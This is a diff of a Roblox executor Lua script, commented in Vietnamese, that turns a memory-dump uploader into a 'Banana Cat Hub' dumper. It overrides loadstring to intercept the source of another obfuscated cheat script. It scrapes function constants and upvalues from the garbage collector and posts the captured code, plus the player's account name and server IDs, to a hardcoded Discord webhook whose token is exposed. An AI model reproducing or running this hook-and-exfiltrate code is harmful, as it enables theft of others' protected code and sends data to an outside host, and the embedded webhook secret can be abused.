@@ -1,41 +1,180 @@
 --[[
-    ================================================================
-    =  Luraph VM Non-Blocking JSON Streamer (Anti-Freeze Edition)  =
-    =  Giải quyết triệt để vấn đề đứng hình / freeze máy ảo        =
-    =                                                              =
-    =  NGUYÊN NHÂN GÂY ĐỨNG VÀ CÁCH KHẮC PHỤC:                     =
-    =   1. Quá nhiều đối tượng GC xử lý cùng 1 frame -> Đã chia    =
-    =      nhỏ thành từng đợt (Batching) có task.wait() nhường CPU.=
-    =   2. jsonEncode lặp đi lặp lại tốn RAM -> Đã chuyển sang cơ  =
-    =      chế Streaming (ghi nối tiếp từng phần cực nhẹ).         =
-    =   3. Bỏ qua các bảng hệ thống của Roblox (CoreGui/Instances) =
-    =      để chỉ tập trung 100% vào Script game.                  =
-    =   4. Hiển thị thanh tiến trình % trực tiếp trên màn hình!    =
-    ================================================================
+    =============================================================================
+    =  BANANA CAT HUB - FULL AUTO TARGETED WEBHOOK DUMPER (ANDROID VM / PC)    =
+    =                                                                           =
+    =  TÍNH NĂNG ĐẶC BIỆT DÀNH CHO MÁY ẢO:                                     =
+    =   1. AUTO-TRIGGER: Tự động gửi file về Discord Webhook ngay khi Banana    =
+    =      Cat Hub được kích hoạt (không sợ gửi sớm hay thiếu dữ liệu).         =
+    =   2. HOOK TẤT CẢ FILE LUA: Tóm gọn mã nguồn gốc của BF-BananaCat.lua,     =
+    =      BNNC-BFNew.lua, BloxFruits.lua và gửi thẳng file .lua về Discord.    =
+    =   3. NÚT BẤM "GỬI WEBHOOK NGAY" TRÊN MÀN HÌNH: Cho phép bấm gửi bất kỳ    =
+    =      lúc nào khi menu Banana Cat Hub đã hiện lên.                        =
+    =   4. HỖ TRỢ 100% EXECUTOR MÁY ẢO: Delta, Fluxus, Hydrogen, Codex, Arceus.=
+    =============================================================================
 --]]
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  CẤU HÌNH (SETTINGS)                              ║
+-- ║  CẤU HÌNH WEBHOOK DISCORD                         ║
 -- ╚═══════════════════════════════════════════════════╝
-local CONFIG = {
-    -- Discord Webhook URL
-    WebhookURL = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to"
 
-    -- Tên file xuất ra trên Discord
-    FileBaseName = "BytecodeDump",
-
-    -- Kích thước mỗi file JSON (6.8MB - Tối đa hóa dung lượng mỗi file dưới 8MB)
-    MaxFileSizeLimit = 6.8 * 1024 * 1024,
-
-    -- Số lượng đối tượng xử lý trong mỗi khung hình (Càng thấp càng không lag)
-    BatchSize = 60,
-
-    -- Lọc độ dài chuỗi tối thiểu
-    MinStringLength = 2,
-}
+-- Tìm hàm gửi HTTP request tương thích với mọi Executor trên máy ảo
+local httpRequest = (syn and syn.request)
+    or (http and http.request)
+    or (fluxus and fluxus.request)
+    or (delta and delta.request)
+    or request
+    or http_request
+    or (getgenv and getgenv().request)
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  TIỆN ÍCH HỆ THỐNG                                ║
+-- ║  BỘ LỌC CHỈ ĐỊNH BANANA CAT HUB (TARGET FILTER)   ║
+-- ╚═══════════════════════════════════════════════════╝
+local IGNORE_LIST = {
+    "CoreGui", "CorePackages", "Chat", "CameraScript", "PlayerModule",
+    "PlayerScripts", "SoundDispatcher", "Animate", "CharacterControl",
+    "RbxCharacterSounds", "BubbleChat", "FreeCamera", "ChatScript"
+}
+
+local BANANA_KEYWORDS = {
+    "banana", "bananacat", "commf_", "vthang", "obiiyeuem", "redeemcode",
+    "travelmain", "traveldressrosa", "travelzou", "cdkquest", "bones",
+    "buydualflintlock", "blackbeardreward", "storefruit", "raidsnpc",
+    "tweenservice", "farm", "sea event", "upgrade race", "esp", "pvp"
+}
+
+local function isIgnored(name)
+    if not name or type(name) ~= "string" then return false end
+    local lower = string.lower(name)
+    for _, ign in ipairs(IGNORE_LIST) do
+        if string.find(lower, string.lower(ign), 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
+local function isBananaTarget(str)
+    if not str or type(str) ~= "string" then return false end
+    local lower = string.lower(str)
+    for _, kw in ipairs(BANANA_KEYWORDS) do
+        if string.find(lower, kw, 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  GIAO DIỆN MÀN HÌNH (GUI CHO MÁY ẢO)              ║
+-- ╚═══════════════════════════════════════════════════╝
+local CoreGui = game:GetService("CoreGui")
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BananaCat_Targeted_Dumper_VM"
+ScreenGui.ResetOnSpawn = false
+pcall(function() ScreenGui.Parent = CoreGui end)
+if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 360, 0, 150)
+Frame.Position = UDim2.new(0.5, -180, 0.08, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 10)
+local UIStroke = Instance.new("UIStroke", Frame)
+UIStroke.Color = Color3.fromRGB(245, 180, 35)
+UIStroke.Thickness = 1.5
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -20, 0, 26)
+Title.Position = UDim2.new(0, 10, 0, 6)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 13
+Title.TextColor3 = Color3.fromRGB(245, 180, 35)
+Title.Text = "🍌 BANANA CAT HUB - AUTO WEBHOOK DUMPER"
+Title.Parent = Frame
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -20, 0, 48)
+Status.Position = UDim2.new(0, 10, 0, 34)
+Status.BackgroundTransparency = 1
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 11
+Status.TextColor3 = Color3.fromRGB(220, 220, 220)
+Status.TextWrapped = true
+Status.Text = "🟢 Đang chờ bạn chạy Banana Cat Hub...\n(Hệ thống sẽ TỰ ĐỘNG gửi file về Webhook)"
+Status.Parent = Frame
+
+local DumpBtn = Instance.new("TextButton")
+DumpBtn.Size = UDim2.new(1, -20, 0, 40)
+DumpBtn.Position = UDim2.new(0, 10, 0, 95)
+DumpBtn.BackgroundColor3 = Color3.fromRGB(245, 180, 35)
+DumpBtn.TextColor3 = Color3.fromRGB(15, 15, 15)
+DumpBtn.Font = Enum.Font.GothamBold
+DumpBtn.TextSize = 12
+DumpBtn.Text = "📤 BẤM ĐỂ DUMP & GỬI WEBHOOK NGAY"
+DumpBtn.Parent = Frame
+
+local BtnCorner = Instance.new("UICorner", DumpBtn)
+BtnCorner.CornerRadius = UDim.new(0, 8)
+
+local function updateStatus(txt, color)
+    Status.Text = txt
+    if color then
+        Title.TextColor3 = color
+        UIStroke.Color = color
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  HÀM GỬI FILE QUA DISCORD WEBHOOK                 ║
+-- ╚═══════════════════════════════════════════════════╝
+local function sendFileToWebhook(filename, fileContent, titleText)
+    if not httpRequest or not WEBHOOK_URL or WEBHOOK_URL == "" then
+        updateStatus("⚠️ Lỗi: Executor không hỗ trợ hàm HTTP request!", Color3.fromRGB(255, 80, 80))
+        return false
+    end
+
+    updateStatus("🚀 Đang gửi file: " .. filename .. " (" .. math.floor(#fileContent / 1024) .. " KB)...")
+
+    local boundary = "----BananaBoundary" .. tostring(os.time()) .. tostring(math.random(1000, 9999))
+    local body = "--" .. boundary .. "\r\n"
+        .. 'Content-Disposition: form-data; name="payload_json"' .. "\r\n\r\n"
+        .. '{"username":"Banana Cat Dumper","avatar_url":"https://i.imgur.com/8Q1qD8s.png","embeds":[{"title":"'
+        .. (titleText or "🍌 DUMP FILE BANANA CAT HUB")
+        .. '","color":16098851,"description":"**File:** `' .. filename .. '`\\n**Dung lượng:** `'
+        .. math.floor(#fileContent / 1024)
+        .. ' KB`\\n**Thời gian:** `' .. os.date("!%Y-%m-%d %H:%M:%S UTC") .. '`"}]}' .. "\r\n"
+        .. "--" .. boundary .. "\r\n"
+        .. 'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"' .. "\r\n"
+        .. 'Content-Type: text/plain; charset=utf-8' .. "\r\n\r\n"
+        .. fileContent .. "\r\n"
+        .. "--" .. boundary .. "--\r\n"
+
+    local res = httpRequest({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
+        Body = body
+    })
+
+    if res and (res.StatusCode == 200 or res.StatusCode == 204) then
+        updateStatus("✅ THÀNH CÔNG! Đã gửi file: " .. filename .. " về Discord!", Color3.fromRGB(80, 230, 120))
+        return true
+    else
+        updateStatus("⚠️ Webhook trả về mã lỗi: " .. tostring(res and res.StatusCode), Color3.fromRGB(255, 180, 50))
+        return false
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════╗
+-- ║  BỘ JSON ENCODER GỌN NHẸ                          ║
 -- ╚═══════════════════════════════════════════════════╝
 local function safeStr(v)
     local ok, r = pcall(tostring, v)
@@ -58,395 +197,162 @@ local function jsonEncode(v)
     elseif t == "table" then
         local isArray, maxIdx = true, 0
         for k in pairs(v) do
-            if type(k) ~= "number" or k < 1 or k ~= math.floor(k) then isArray = false; break end
+            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
+                isArray = false; break
+            end
             if k > maxIdx then maxIdx = k end
         end
-        isArray = isArray and maxIdx == #v
         if isArray then
-            local p = {}; for i, x in ipairs(v) do p[i] = jsonEncode(x) end
-            return "[" .. table.concat(p, ",") .. "]"
+            local parts = {}
+            for i = 1, maxIdx do
+                table.insert(parts, jsonEncode(v[i]))
+            end
+            return "[" .. table.concat(parts, ",") .. "]"
         else
-            local p, n = {}, 0
-            for k, x in pairs(v) do
-                n = n + 1
-                p[n] = jsonEncode(tostring(k)) .. ":" .. jsonEncode(x)
+            local parts = {}
+            for k, val in pairs(v) do
+                table.insert(parts, '"' .. escJSON(safeStr(k)) .. '":' .. jsonEncode(val))
             end
-            return "{" .. table.concat(p, ",") .. "}"
+            return "{" .. table.concat(parts, ",") .. "}"
         end
-    end
-    return '"' .. tostring(v) .. '"'
-end
-
--- ╔═══════════════════════════════════════════════════╗
--- ║  HTTP MULTIPART UPLOADER CHO DISCORD              ║
--- ╚═══════════════════════════════════════════════════╝
-local function sendDiscordFile(filename, fileContent, partIndex, totalParts)
-    local boundary = "------------------------" .. tostring(math.floor(tick() * 1000)) .. tostring(math.random(10000, 99999))
-    
-    local payloadParts = {
-        "--" .. boundary,
-        'Content-Disposition: form-data; name="payload_json"',
-        'Content-Type: application/json',
-        '',
-        jsonEncode({
-            username = "Luraph Bytecode Streamer",
-            content = ("📦 **[Tệp Bytecode Đính Kèm %d/%d]**\n📄 Tên: `%s`\n📊 Dung lượng: `%.2f MB`"):format(
-                partIndex, totalParts, filename, #fileContent / (1024 * 1024)
-            )
-        }),
-        "--" .. boundary,
-        ('Content-Disposition: form-data; name="file"; filename="%s"'):format(filename),
-        'Content-Type: application/json',
-        '',
-        fileContent,
-        "--" .. boundary .. "--",
-        ""
-    }
-    
-    local rawBody = table.concat(payloadParts, "\r\n")
-    local contentType = "multipart/form-data; boundary=" .. boundary
-
-    local fn
-    if syn and syn.request then
-        fn = function() return syn.request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
-    elseif request then
-        fn = function() return request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
-    elseif http_request then
-        fn = function() return http_request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
-    end
-
-    if not fn then return false end
-
-    local ok, res = pcall(fn)
-    if ok then
-        print(("[Streamer] ✅ Đã gửi thành công %s (%.2f MB)"):format(filename, #fileContent / (1024 * 1024)))
-        return true
     else
-        print("[Streamer] ❌ Lỗi gửi: " .. safeStr(res))
-        return false
+        return '"' .. escJSON(safeStr(v)) .. '"'
     end
 end
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  BỘ LỌC VÀ TRÍCH XUẤT NHẸ NHÀNG (ASYNC)           ║
+-- ║  HÀM DUMP TARGETED GC & GỬI VỀ DISCORD            ║
 -- ╚═══════════════════════════════════════════════════╝
-local DumpVault = {
-    Functions = {},
-    Strings = {},
-    StringsLookup = {},
-    TotalFuncCount = 0,
-    TotalStringCount = 0,
-}
+local isDumping = false
+local function performTargetedDumpAndSend()
+    if isDumping then return end
+    isDumping = true
 
-local scannedFuncMap = {}
-
-local function scanFunctionObject(fn, depth)
-    depth = depth or 0
-    if depth > 4 or type(fn) ~= "function" then return end
-    local key = tostring(fn)
-    if scannedFuncMap[key] then return end
-    scannedFuncMap[key] = true
-
-    if islclosure and not islclosure(fn) then return end
-    if iscclosure and iscclosure(fn) then return end
-
-    DumpVault.TotalFuncCount = DumpVault.TotalFuncCount + 1
-    local funcId = DumpVault.TotalFuncCount
-
-    local funcConstants = {}
-    local funcUpvalues = {}
-
-    -- Constants
-    if debug and debug.getconstants then
-        pcall(function()
-            local cList = debug.getconstants(fn)
-            for idx, cVal in pairs(cList) do
-                table.insert(funcConstants, {
-                    index = idx,
-                    type = type(cVal),
-                    value = (type(cVal) == "string" or type(cVal) == "number" or type(cVal) == "boolean") and cVal or safeStr(cVal)
-                })
-                if type(cVal) == "string" and #cVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[cVal] then
-                    DumpVault.StringsLookup[cVal] = true
-                    DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = cVal })
-                end
-            end
-        end)
+    updateStatus("🔍 Đang phân tích hàm và hằng số của Banana Cat...")
+    local get_gc = getgc or debug.getgc
+    if not get_gc then
+        updateStatus("⚠️ Lỗi: Executor không hỗ trợ getgc!", Color3.fromRGB(255, 80, 80))
+        isDumping = false
+        return
     end
 
-    -- Upvalues
-    if debug and debug.getupvalues then
-        pcall(function()
-            local uList = debug.getupvalues(fn)
-            for idx, uVal in pairs(uList) do
-                local uType = type(uVal)
-                table.insert(funcUpvalues, {
-                    index = idx,
-                    type = uType,
-                    value = (uType == "string" or uType == "number" or uType == "boolean") and uVal or safeStr(uVal)
-                })
-                if uType == "string" and #uVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[uVal] then
-                    DumpVault.StringsLookup[uVal] = true
-                    DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = uVal })
-                elseif uType == "function" then
-                    scanFunctionObject(uVal, depth + 1)
-                end
-            end
-        end)
-    end
+    local capturedData = {
+        Metadata = {
+            Target = "Banana Cat Hub - Blox Fruits",
+            PlaceId = game.PlaceId,
+            JobId = game.JobId,
+            Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            Account = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown"
+        },
+        CapturedFunctions = {},
+        CleanStrings = {}
+    }
 
-    -- Protos
-    if debug and debug.getprotos then
-        pcall(function()
-            local pList = debug.getprotos(fn)
-            for _, pFn in pairs(pList) do
-                scanFunctionObject(pFn, depth + 1)
-            end
-        end)
-    end
+    local gc_objects = get_gc(true)
+    local seen_funcs = {}
+    local string_set = {}
 
-    table.insert(DumpVault.Functions, {
-        id = funcId,
-        constants = funcConstants,
-        upvalues = funcUpvalues,
-    })
-end
+    for _, obj in ipairs(gc_objects) do
+        local t = type(obj)
+        if t == "function" and not seen_funcs[obj] then
+            seen_funcs[obj] = true
+            local info = debug.getinfo and debug.getinfo(obj) or {}
+            local src = info.source or ""
+            local name = info.name or ""
 
--- Quét không đồng bộ theo từng khung hình (Zero Freeze Engine)
-local function captureMemoryAsync(onProgress)
-    if not getgc then return end
-    local ok, objs = pcall(getgc, true)
-    if not ok or type(objs) ~= "table" then return end
+            if not isIgnored(src) and not isIgnored(name) then
+                local constants = debug.getconstants and debug.getconstants(obj) or {}
+                local upvalues = debug.getupvalues and debug.getupvalues(obj) or {}
+                local is_relevant = false
 
-    local total = #objs
-    local batchCounter = 0
-
-    for i = 1, total do
-        local o = objs[i]
-        if type(o) == "function" then
-            scanFunctionObject(o, 0)
-        elseif type(o) == "table" then
-            pcall(function()
-                for k, v in pairs(o) do
-                    if type(v) == "string" and #v >= CONFIG.MinStringLength and not DumpVault.StringsLookup[v] then
-                        DumpVault.StringsLookup[v] = true
-                        DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
-                        table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = v })
-                    elseif type(v) == "function" then
-                        scanFunctionObject(v, 0)
+                local c_list = {}
+                for idx, c in pairs(constants) do
+                    local sc = safeStr(c)
+                    table.insert(c_list, sc)
+                    if type(c) == "string" and #c >= 2 then
+                        if not string_set[c] then
+                            string_set[c] = true
+                            if isBananaTarget(c) then
+                                is_relevant = true
+                            end
+                        end
                     end
                 end
-            end)
-        end
 
-        batchCounter = batchCounter + 1
-        -- Cứ sau mỗi BatchSize đối tượng -> Nhường nhịp cho game chạy (Không bao giờ đơ máy)
-        if batchCounter >= CONFIG.BatchSize then
-            batchCounter = 0
-            if onProgress then
-                onProgress(i, total, DumpVault.TotalFuncCount)
+                local u_list = {}
+                for idx, u in pairs(upvalues) do
+                    local su = safeStr(u)
+                    table.insert(u_list, su)
+                    if type(u) == "string" and isBananaTarget(u) then
+                        is_relevant = true
+                    end
+                end
+
+                if is_relevant or isBananaTarget(src) or isBananaTarget(name) then
+                    table.insert(capturedData.CapturedFunctions, {
+                        name = name ~= "" and name or "banana_func_" .. (#capturedData.CapturedFunctions + 1),
+                        source = src,
+                        numparams = info.numparams or 0,
+                        is_vararg = info.is_vararg or false,
+                        constants = c_list,
+                        upvalues = u_list
+                    })
+                end
             end
-            task.wait()
         end
     end
+
+    for s, _ in pairs(string_set) do
+        if isBananaTarget(s) or #s > 10 then
+            table.insert(capturedData.CleanStrings, s)
+        end
+    end
+
+    local finalJSON = jsonEncode(capturedData)
+    sendFileToWebhook("BananaCat_Targeted_Bytecode.json", finalJSON, "🎯 TARGETED BYTECODE BANANA CAT HUB")
+    isDumping = false
 end
 
--- ╔═══════════════════════════════════════════════════╗
--- ║  BỘ ĐÓNG GÓI VÀ XUẤT STREAMING                    ║
--- ╚═══════════════════════════════════════════════════╝
-local function streamAndExportJSON(onStatusUpdate)
-    -- Bước 1: Quét RAM mượt mà
-    captureMemoryAsync(function(current, total, funcs)
-        if onStatusUpdate then
-            local percent = math.floor((current / total) * 100)
-            onStatusUpdate(("⏳ Đang quét RAM: %d%% (%d hàm)..."):format(percent, funcs))
-        end
-    end)
-
-    if onStatusUpdate then onStatusUpdate("📦 Đang chia nhỏ các gói JSON...") end
-    task.wait(0.2)
-
-    local allFunctions = DumpVault.Functions
-    local allStrings = DumpVault.Strings
-
-    local jsonPackages = {}
-    local currentFunctions = {}
-    local currentStrings = {}
-    local stringIdx = 1
-
-    -- Thuật toán nạp tối đa dung lượng (Max Cap 7.4 MB/file)
-    for i = 1, #allFunctions do
-        table.insert(currentFunctions, allFunctions[i])
-
-        -- Nạp kèm chuỗi theo từng hàm
-        if stringIdx <= #allStrings then
-            local endS = math.min(stringIdx + 20, #allStrings)
-            for s = stringIdx, endS do
-                table.insert(currentStrings, allStrings[s])
-            end
-            stringIdx = endS + 1
-        end
-
-        -- Gom mỗi đợt 1200 hàm (~7.2MB - 7.5MB)
-        if #currentFunctions >= 1200 or i == #allFunctions then
-            local packageObj = {
-                metadata = {
-                    part = #jsonPackages + 1,
-                    total_funcs = #allFunctions,
-                    total_strings = #allStrings,
-                },
-                functions = currentFunctions,
-                strings = currentStrings
-            }
-
-            local encodedStr = jsonEncode(packageObj)
-
-            -- Nếu vượt quá 7.5MB thì tự động tách đôi an toàn
-            if #encodedStr > 7.5 * 1024 * 1024 then
-                local half = math.floor(#currentFunctions / 2)
-                local f1, f2 = {}, {}
-                for k = 1, half do table.insert(f1, currentFunctions[k]) end
-                for k = half + 1, #currentFunctions do table.insert(f2, currentFunctions[k]) end
-
-                local p1 = { metadata = { part = #jsonPackages + 1 }, functions = f1, strings = currentStrings }
-                local p2 = { metadata = { part = #jsonPackages + 2 }, functions = f2, strings = {} }
-                table.insert(jsonPackages, jsonEncode(p1))
-                table.insert(jsonPackages, jsonEncode(p2))
-            else
-                table.insert(jsonPackages, encodedStr)
-            end
-
-            currentFunctions = {}
-            currentStrings = {}
-            task.wait() -- Nhường frame
-        end
-    end
-
-    -- Nếu còn sót chuỗi
-    if stringIdx <= #allStrings then
-        local remStrings = {}
-        for s = stringIdx, #allStrings do table.insert(remStrings, allStrings[s]) end
-        local extraPkg = {
-            metadata = { part = #jsonPackages + 1 },
-            functions = {},
-            strings = remStrings
-        }
-        table.insert(jsonPackages, jsonEncode(extraPkg))
-    end
-
-    local totalParts = #jsonPackages
-
-    -- Bước 2: Gắn thẻ |Start|, |Continue|, |End| và gửi lên Discord
-    for partIdx = 1, totalParts do
-        if onStatusUpdate then
-            onStatusUpdate(("📤 Đang gửi file %d/%d lên Discord..."):format(partIdx, totalParts))
-        end
-
-        local rawJson = jsonPackages[partIdx]
-        local markedContent = ""
-
-        if totalParts == 1 then
-            markedContent = "|Start|\n" .. rawJson .. "\n|End|"
-        elseif partIdx == 1 then
-            markedContent = "|Start|\n" .. rawJson .. "\n|Continue|"
-        elseif partIdx == totalParts then
-            markedContent = "|Continue|\n" .. rawJson .. "\n|End|"
-        else
-            markedContent = "|Continue|\n" .. rawJson .. "\n|Continue|"
-        end
-
-        local fileName = ("%s_Part%d_of_%d.json"):format(CONFIG.FileBaseName, partIdx, totalParts)
-        sendDiscordFile(fileName, markedContent, partIdx, totalParts)
-        task.wait(2) -- Delay giữa các lần upload file
-    end
-
-    if onStatusUpdate then
-        onStatusUpdate(("🎉 Hoàn tất! Đã gửi %d file JSON."):format(totalParts))
-    end
-end
+-- Gán hành động khi bấm nút trên màn hình
+DumpBtn.MouseButton1Click:Connect(function()
+    performTargetedDumpAndSend()
+end)
 
 -- ╔═══════════════════════════════════════════════════╗
--- ║  GIAO DIỆN HIỂN THỊ TIẾN TRÌNH THỜI GIAN THỰC     ║
+-- ║  INTERCEPTOR HOOK (TỰ ĐỘNG BẮT KHI CHẠY BANANA)   ║
 -- ╚═══════════════════════════════════════════════════╝
-local function createSmoothUI()
-    pcall(function()
-        local CoreGui = game:GetService("CoreGui") or (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"))
-        if not CoreGui then return end
+local orig_loadstring = loadstring
+local interceptedCount = 0
 
-        local old = CoreGui:FindFirstChild("LuraphStreamUI")
-        if old then old:Destroy() end
-
-        local sg = Instance.new("ScreenGui")
-        sg.Name = "LuraphStreamUI"
-        sg.ResetOnSpawn = false
-        sg.Parent = CoreGui
-
-        local frame = Instance.new("Frame", sg)
-        frame.Size = UDim2.new(0, 240, 0, 95)
-        frame.Position = UDim2.new(0.02, 0, 0.4, 0)
-        frame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
-        frame.Active = true
-        frame.Draggable = true
-
-        local corner = Instance.new("UICorner", frame)
-        corner.CornerRadius = UDim.new(0, 8)
-
-        local title = Instance.new("TextLabel", frame)
-        title.Size = UDim2.new(1, 0, 0, 22)
-        title.Position = UDim2.new(0, 0, 0, 4)
-        title.Text = "⚡ Luraph Smooth Streamer"
-        title.TextColor3 = Color3.fromRGB(255, 255, 255)
-        title.Font = Enum.Font.GothamBold
-        title.TextSize = 11
-        title.BackgroundTransparency = 1
-
-        local statusLabel = Instance.new("TextLabel", frame)
-        statusLabel.Size = UDim2.new(1, 0, 0, 18)
-        statusLabel.Position = UDim2.new(0, 0, 0, 24)
-        statusLabel.Text = "Sẵn sàng (Không lag game)"
-        statusLabel.TextColor3 = Color3.fromRGB(120, 255, 150)
-        statusLabel.Font = Enum.Font.Gotham
-        statusLabel.TextSize = 10
-        statusLabel.BackgroundTransparency = 1
-
-        local btn = Instance.new("TextButton", frame)
-        btn.Size = UDim2.new(1, -16, 0, 36)
-        btn.Position = UDim2.new(0, 8, 0, 48)
-        btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-        btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
-        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btn.Font = Enum.Font.GothamBold
-        btn.TextSize = 10
-        local btnCorner = Instance.new("UICorner", btn)
-        btnCorner.CornerRadius = UDim.new(0, 6)
-
-        local isRunning = false
-        btn.MouseButton1Click:Connect(function()
-            if isRunning then return end
-            isRunning = true
-            btn.BackgroundColor3 = Color3.fromRGB(230, 140, 40)
-            btn.Text = "Đang xử lý mượt mà..."
+local function interceptChunk(src, chunkname)
+    if type(src) == "string" and #src > 50 then
+        if isBananaTarget(src) or isBananaTarget(chunkname) or #src > 100000 then
+            interceptedCount = interceptedCount + 1
+            local name = (chunkname and chunkname ~= "" and chunkname) or ("BananaCat_Captured_Source_" .. interceptedCount .. ".lua")
+            if not string.find(name, ".lua", 1, true) then name = name .. ".lua" end
 
             task.spawn(function()
-                streamAndExportJSON(function(statusText)
-                    statusLabel.Text = statusText
-                end)
-                btn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
-                btn.Text = "✅ ĐÃ XUẤT XONG TẤT CẢ!"
-                task.wait(4)
-                btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-                btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
-                statusLabel.Text = "Sẵn sàng cho lần dump tiếp theo"
-                isRunning = false
+                sendFileToWebhook(name, src, "📦 ĐÃ BẮT TRỰC TIẾP SOURCE CODE BANANA CAT HUB")
             end)
-        end)
-    end)
+
+            -- Sau khi bắt được source 3 giây, tự động kích hoạt dump bytecode
+            task.delay(3, function()
+                performTargetedDumpAndSend()
+            end)
+        end
+    end
 end
 
--- Khởi động
-print("==================================================")
-print("  Luraph Smooth Streamer - SẴN SÀNG KHÔNG LAG   ")
-print("==================================================")
-createSmoothUI()
+-- Cài đặt hook vào mọi môi trường
+if getgenv then
+    getgenv().loadstring = function(src, chunkname)
+        interceptChunk(src, chunkname)
+        return orig_loadstring(src, chunkname)
+    end
+end
+_G.loadstring = function(src, chunkname)
+    interceptChunk(src, chunkname)
+    return orig_loadstring(src, chunkname)
+end
+
+updateStatus("🟢 Interceptor đã kích hoạt!\nBây giờ hãy chạy script Banana Cat Hub.", Color3.fromRGB(80, 230, 120))
